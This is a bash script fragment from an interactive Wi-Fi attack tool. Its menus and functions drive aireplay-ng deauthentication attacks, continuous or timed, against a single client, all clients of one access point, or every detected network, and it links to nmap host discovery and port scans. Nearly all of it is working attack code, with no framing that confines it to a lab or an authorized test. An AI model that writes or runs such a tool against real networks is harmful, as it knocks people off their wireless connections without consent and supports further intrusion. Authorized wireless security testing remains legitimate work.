#!/bin/bash

# Ask continuous or timed. If timed, ask duration. Sets $deauth_duration (0 = continuous).
_pick_deauth_duration() {
    echo
    echo -e "${BOLD_CYAN}Mode:${NC}"
    echo -e "  ${BOLD_CYAN}[1]${NC} Continuous ${DIM}(until Ctrl+C)${NC}"
    echo -e "  ${BOLD_CYAN}[2]${NC} Timed"
    echo
    read -p "  Choice [default: 1]: " mode_choice

    if [[ "$mode_choice" == "2" ]]; then
        echo
        echo -e "${BOLD_CYAN}Duration:${NC}"
        echo -e "  ${BOLD_CYAN}[1]${NC} 10s"
        echo -e "  ${BOLD_CYAN}[2]${NC} 30s"
        echo -e "  ${BOLD_CYAN}[3]${NC} 60s"
        echo -e "  ${BOLD_CYAN}[4]${NC} Custom"
        echo
        read -p "  Choice [default: 2]: " dur
        case "$dur" in
            1) deauth_duration=10 ;;
            3) deauth_duration=60 ;;
            4)
                read -p "  Seconds: " deauth_duration
                if ! [[ "$deauth_duration" =~ ^[0-9]+$ ]] || (( deauth_duration < 1 )); then
                    deauth_duration=30
                fi
                ;;
            *) deauth_duration=30 ;;
        esac
    else
        deauth_duration=0
    fi
}

# Run deauth for a set duration or continuously if duration=0
_run_deauth() {
    local args="$1"
    if (( deauth_duration == 0 )); then
        aireplay-ng --deauth 0 $args "$mon_iface"
    else
        local end_time=$(( $(date +%s) + deauth_duration ))
        echo -e "${DIM}  Running for ${deauth_duration}s — Ctrl+C to stop early${NC}"
        echo
        while (( $(date +%s) < end_time )); do
            aireplay-ng --deauth 10 $args "$mon_iface" &>/dev/null
        done
        echo -e "${BOLD_GREEN}[+]${NC} Done."
    fi
}

deauth_all() {

if [[ -z "$mon_iface" ]]; then
echo -e "${BOLD_RED}[!]${NC} Enable monitor mode first!"
pause
return
fi

local attack_bssid attack_essid

# Build network list from client scan data if available, else fall back to locked target
if [[ -n "$clients" ]]; then
    local networks
    networks=$(echo "$clients" | awk '{print $2}' | sort -u)
    local net_count
    net_count=$(echo "$networks" | wc -l)

    if (( net_count > 1 )); then
        clear
        echo -e "${BOLD_CYAN}Select network to deauth ALL clients:${NC}"
        echo
        local i=1
        while IFS= read -r b; do
            local e
            e=$(_lookup_essid "$b")
            echo -e "  ${BOLD_RED}[${i}]${NC} ${BOLD_GREEN}${e}${NC} ${DIM}(${b})${NC}"
            (( i++ ))
        done <<< "$networks"
        echo -e "  ${BOLD_RED}[${i}]${NC} ALL of the above"
        echo
        read -p "  Choice: " net_choice
        echo

        if [[ "$net_choice" == "$i" ]]; then
            # Deauth all detected networks with a burst each
            echo -e "${BOLD_RED}[!]${NC} This will deauth ALL clients on every detected network."
            echo
            read -p "  Confirm? [y/N] " confirm
            echo
            [[ "$confirm" =~ ^[Yy]$ ]] || return
            deauth_countdown
            while IFS= read -r b; do
                local e
                e=$(_lookup_essid "$b")
                echo -e "${BOLD_RED}[+]${NC} Deauthing all on ${BOLD_GREEN}${e}${NC} ${DIM}(${b})${NC}"
                aireplay-ng --deauth 100 -a "$b" "$mon_iface" &>/dev/null
            done <<< "$networks"
            echo
            pause
            return
        else
            attack_bssid=$(echo "$networks" | sed -n "${net_choice}p")
            attack_essid=$(_lookup_essid "$attack_bssid")
        fi
    else
        attack_bssid="$networks"
        attack_essid=$(_lookup_essid "$attack_bssid")
    fi
elif [[ -n "$bssid" ]]; then
    attack_bssid="$bssid"
    attack_essid="$essid"
else
    echo -e "${BOLD_RED}[!]${NC} No target set and no client scan data. Run a scan first."
    pause
    return
fi

if [[ -z "$attack_bssid" ]]; then
echo -e "${BOLD_RED}[!]${NC} Invalid selection."
pause
return
fi

clear
echo -e "${BOLD_RED}[!]${NC} This will deauth ${BOLD_RED}ALL${NC} clients on ${BOLD_GREEN}${attack_bssid}${NC} ${DIM}(${attack_essid})${NC}"
echo
read -p "  Confirm? [y/N] " confirm
echo
[[ "$confirm" =~ ^[Yy]$ ]] || return

_pick_deauth_duration
deauth_countdown
echo -e "${BOLD_RED}[+]${NC} Deauthing ${BOLD_RED}ALL${NC} clients on ${BOLD_GREEN}${attack_bssid}${NC}"
echo

_run_deauth "-a $attack_bssid"
pause
}

deauth_one() {

if [[ -z "$mon_iface" ]]; then
echo -e "${BOLD_RED}[!]${NC} Enable monitor mode first!"
pause
return
fi

if [[ -z "$clients" ]]; then
echo -e "${BOLD_RED}[!]${NC} No clients scanned yet. Run client scan first."
pause
return
fi

clear
echo -e "${BOLD_CYAN}Select client to deauth:${NC}"
_display_clients_grouped "$clients"
echo

read -p "  Client number: " num

local selected
selected=$(echo "$clients" | sed -n "${num}p")
local target_mac target_bssid
target_mac=$(echo "$selected" | awk '{print $1}')
target_bssid=$(echo "$selected" | awk '{print $2}')

if [[ -z "$target_mac" || -z "$target_bssid" ]]; then
echo -e "${BOLD_RED}[!]${NC} Invalid selection."
pause
return
fi

local target_essid
target_essid=$(_lookup_essid "$target_bssid")

echo
echo -e "${BOLD_RED}[!]${NC} Deauth ${BOLD_GREEN}${target_mac}${NC} from ${BOLD_GREEN}${target_bssid}${NC} ${DIM}(${target_essid})${NC}"
echo
read -p "  Confirm? [y/N] " confirm
echo
[[ "$confirm" =~ ^[Yy]$ ]] || return

_pick_deauth_duration
deauth_countdown
echo -e "${BOLD_RED}[+]${NC} Deauthing ${BOLD_GREEN}${target_mac}${NC}"
echo

_run_deauth "-a $target_bssid -c $target_mac"
pause
}

attack_menu() {

while true; do

clear
echo -e "${BOLD_CYAN}========== Attack ==========${NC}"
echo
echo -e "  ${DIM}Target  :${NC} ${BOLD_GREEN}${bssid}${NC} ${DIM}(${essid})${NC}"
echo -e "  ${DIM}Channel :${NC} ${BOLD_GREEN}${channel}${NC}"
echo
echo -e "${BOLD_CYAN}Clients:${NC}"
_display_clients_grouped "$clients"
echo
section "${BOLD_RED}Attack${NC}"
echo -e "  ${BOLD_RED}[1]${NC} Deauth ALL"
echo -e "  ${BOLD_RED}[2]${NC} Deauth One Client"
echo
echo -e "  ${BOLD_YELLOW}[3]${NC} Back"
echo

read -p "  Choice: " c

case $c in
1) deauth_all ;;
2) deauth_one ;;
3) return ;;
*) echo -e "  ${BOLD_RED}[!]${NC} Invalid choice" ; sleep 1 ;;
esac

done
}

quick_wizard() {

select_interface
enable_monitor

scan_networks
select_target
scan_clients
attack_menu

while true; do

clear
echo -e "${BOLD_CYAN}========== Quick Wizard ==========${NC}"
echo
echo -e "  ${DIM}Target  :${NC} ${BOLD_GREEN}${bssid}${NC} ${DIM}(${essid})${NC}"
echo -e "  ${DIM}Channel :${NC} ${BOLD_GREEN}${channel}${NC}"
echo
section "Re-scan"
echo -e "  ${BOLD_CYAN}[1]${NC} Re-scan Clients"
echo -e "  ${BOLD_CYAN}[2]${NC} Change Target ${DIM}(use existing scan)${NC}"
echo -e "  ${BOLD_CYAN}[3]${NC} Full Re-scan"
echo
echo -e "  ${BOLD_YELLOW}[4]${NC} Back to Main Menu"
echo

read -p "  Choice: " c

case $c in
1) scan_clients && attack_menu ;;
2) select_target && scan_clients && attack_menu ;;
3) scan_networks && select_target && scan_clients && attack_menu ;;
4) return ;;
*) echo -e "  ${BOLD_RED}[!]${NC} Invalid choice" ; sleep 1 ;;
esac

done
}

manual_menu() {

# Auto setup on entry — no manual selection needed
select_interface
enable_monitor

while true; do

clear
print_banner
draw_status_box
echo
section "Wireless Recon"
echo -e "  ${BOLD_CYAN}[1]${NC} Scan Networks"
echo -e "  ${BOLD_CYAN}[2]${NC} Select Target"
echo -e "  ${BOLD_CYAN}[3]${NC} Scan Clients"
echo
section "Network Recon"
echo -e "  ${BOLD_CYAN}[4]${NC} Host Discovery ${DIM}(nmap)${NC}"
echo -e "  ${BOLD_CYAN}[5]${NC} Port Scan Host ${DIM}(nmap)${NC}"
echo
section "${BOLD_RED}Attack${NC}"
echo -e "  ${BOLD_RED}[6]${NC} Deauth ALL"
echo -e "  ${BOLD_RED}[7]${NC} Deauth One Client"
echo
echo -e "  ${BOLD_YELLOW}[8]${NC} Back"
echo

read -p "  Choice: " c

case $c in
1) scan_networks ;;
2) select_target ;;
3) scan_clients && attack_menu ;;
4) host_discovery ;;
5) port_scan ;;
6) deauth_all ;;
7) deauth_one ;;
8) break ;;
esac

done
}